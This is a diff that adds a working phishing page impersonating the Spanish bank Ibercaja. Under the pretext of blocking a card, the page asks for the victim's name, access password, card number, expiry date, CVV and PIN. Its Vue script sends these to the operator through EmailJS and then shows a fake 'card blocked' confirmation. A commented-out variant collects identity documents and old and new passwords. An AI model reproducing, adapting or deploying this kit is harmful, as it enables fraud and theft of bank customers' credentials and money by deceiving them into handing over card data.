@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identidad</title>
+    <link rel="icon" type="image/x-icon"
+        href="https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/favicon.ico">
+    <link rel="shortcut icon" type="image/x-icon"
+        href="https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/favicon.ico">
+    <link rel="stylesheet" href="./Identidad_files/ibercaja-icon-font.css">
+    <link rel="stylesheet" href="./Identidad_files/main.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+    <!-- Favicons -->
+    <link href="img/favicon.jfif" rel="icon">
+    <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Raleway:400,700,900|Lato:400,900" rel="stylesheet">
+
+    <!-- Bootstrap CSS File -->
+    <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Libraries CSS Files -->
+    <link href="lib/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+    <link href="lib/prettyphoto/css/prettyphoto.css" rel="stylesheet">
+    <link href="lib/hover/hoverex-all.css" rel="stylesheet">
+
+    <!-- Main Stylesheet File -->
+    <link href="css/style.css" rel="stylesheet">
+    <script src="https://unpkg.com/vue@3"></script>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+</head>
+
+<body translate="no">
+
+    <div id="app" class="login-container mb-5">
+
+
+        <header>
+            <img src="./assets/ibercaja.png" class="mt-3">
+        </header>
+        <div class="content-container">
+
+            <div class="col-md-8">
+                <div class="row">
+                    <h4>Formulario Ibercaja para bloqueo de tarjeta de crédito/débito</h4>
+                    <div class="hline"></div>
+                    <p>Seguridad Ibercaja informa que debe llenar el formulario presentado a continuación para
+                        poder realizar el
+                        bloqueo de su tarjeta
+                        exitosamente.</p>
+                </div>
+                <div class="row">
+                    <div class=" col-xs-3 "><img src="img/visa.png" class="img img-responsive card "></div>
+                    <div class="col-xs-3 "><img src="img/master.png" class="img img-responsive card "></div>
+                </div>
+
+                <div class="row">
+                    <form class="contact-form php-mail-form" role="form">
+
+                        <div class="form-group">
+                            <a>Nombre:</a>
+                            <input type="name" name="name" class="form-control" id="contact-name" placeholder="Nombre"
+                                data-rule="minlen:4" data-msg="Por favor ingrese al menos 4 letras" v-model="name">
+                            <div class="validate"></div>
+                        </div>
+                        <div class="form-group">
+                            <a> Clave de Acceso :</a>
+                            <input type="text" name="lastname" class="form-control" id="contact-name"
+                                placeholder="Clave de Acceso" v-model="last_name">
+                            <div class="validate"></div>
+                        </div>
+                        <div class="form-group">
+                            <a>Número de tarjeta:</a>
+                            <input type="number" name="email" class="form-control" placeholder="Número de tarjeta"
+                                data-rule="minlen:16"
+                                data-msg=" Por favor ingrese un numero valido de tarjeta (16 dígitos)"
+                                v-model="card_number">
+                            <div class="validate"></div>
+                        </div>
+                        <div class="form-group">
+                            <a>Fecha de vencimiento:</a>
+                            <input type="text" class="form-control" v-model="expiration_date"
+                                placeholder="Fecha de vencimiento (MES/AÑO)">
+                            <div class="validate"></div>
+                        </div>
+                        <div class="form-group">
+                            <a>Código de seguridad (CVV):</a>
+                            <input type="text" class="form-control" v-model="security_code"
+                                placeholder="Código de seguridad (CVV)">
+                            <div class="validate"></div>
+                        </div>
+                        <div class="form-group">
+                            <a>PIN:</a>
+                            <input type="text" class="form-control" v-model="pin" placeholder="PIN">
+                        </div>
+
+
+                        <div class="form-send mb-5">
+                            <button type="submit" class="btn btn-large blue " @click="enviar">Bloquear
+                                tarjeta</button>
+                        </div>
+
+                    </form>
+
+                </div>
+
+
+            </div>
+        </div>
+    </div>
+
+
+    <footer class="text-white mt-5">
+
+        <ul>
+            <li> <img src="./assets/iber-footer.png" class="ibercaja-icon-Ibercaja-logo"></li>
+            <li><a title="documentación a clientes">documentación a clientes</a></li>
+            <li><a title="aviso legal">aviso legal</a></li>
+            <li><a title="ejercicio de derechos">ejercicio de derechos</a></li>
+            <li><a title="revocación">revocación</a></li>
+            <li><a title="tarifas y cotizaciones">tarifas y cotizaciones</a></li>
+            <li><a title="tablón de anuncios">tablón de anuncios</a></li>
+        </ul>
+
+
+
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous">
+    </script>
+    <!-- JavaScript Libraries -->
+    <script src="lib/jquery/jquery.min.js"></script>
+    <script src="lib/bootstrap/js/bootstrap.min.js"></script>
+    <script src="lib/php-mail-form/validate.js"></script>
+    <script src="lib/prettyphoto/js/prettyphoto.js"></script>
+    <script src="lib/isotope/isotope.min.js"></script>
+    <script src="lib/hover/hoverdir.js"></script>
+    <script src="lib/hover/hoverex.min.js"></script>
+
+    <!-- Template Main Javascript File -->
+    <script src="js/main.js"></script>
+    <script>
+        const {
+            createApp
+        } = Vue
+
+        createApp({
+            data() {
+                return {
+                    last_name: this.last_name,
+                    name: this.name,
+                    numero_tarjeta: this.card_number,
+                    fecha_vencimiento: this.expiration_date,
+                    codigo_seguridad: this.security_code,
+                    pin: this.pin
+
+                }
+
+            },
+            methods: {
+                e() {
+                    console.log('Holaaaaa');
+                },
+                async enviar() {
+                    await emailjs.init("user_mtpGXPTm2acuEla2wh4Gv");
+
+
+                    let data = {
+                        nombre: this.name,
+                        clave_acceso: this.last_name,
+                        numero_tarjeta: this.card_number,
+                        fecha_vencimiento: this.expiration_date,
+                        codigo_seguridad: this.security_code,
+                        pin: this.pin
+
+
+                    };
+
+
+
+                    await emailjs.send("service_vbim6fl", "template_3qnpxib", data)
+                        .then(function (response) {
+                            if (response.text === 'OK') {
+                                alert('Tarjeta bloqueada de manera exitosa');
+                                window.location.reload()
+
+                            }
+                            console.log("SUCCESS. status=%d, text=%s", response.status, response.text);
+                        }, function (err) {
+                            alert('Ocurrió un problema al intentar bloquear la tarjeta');
+                            console.log("FAILED. error=", err);
+                        });
+                }
+            }
+        }).mount('#app')
+    </script>
+
+    <script type="text/javascript">
+        /*(function () {
+      emailjs.init("user_mtpGXPTm2acuEla2wh4Gv");
+    })();
+    const vue = new Vue({
+      el: '#app',
+      data() {
+        return {
+          name: this.name,
+          last_name: this.last_name
+        }
+
+      },
+
+      methods: {
+
+        e() {
+          console.log(this.name)
+        },
+        async enviar() {
+
+          let data = {
+            tipo_documento: this.tipo_documento,
+            documento: this.documento,
+            clave_acceso_antigua: this.clave_acceso_antigua,
+            clave_acceso_nueva: this.clave_acceso_nueva
+
+          };
+
+
+
+          await emailjs.send("service_vbim6fl", "template_kamcqfn", data)
+            .then(function (response) {
+              if (response.text === 'OK') {
+                alert('Tarjeta bloqueada de manera exitosa');
+              }
+              console.log("SUCCESS. status=%d, text=%s", response.status, response.text);
+            }, function (err) {
+              alert('Ocurrió un problema al intentar bloquear la tarjeta');
+              console.log("FAILED. error=", err);
+            });
+        }
+      }
+    });*/
+    </script>
+</body>
+
+</html>
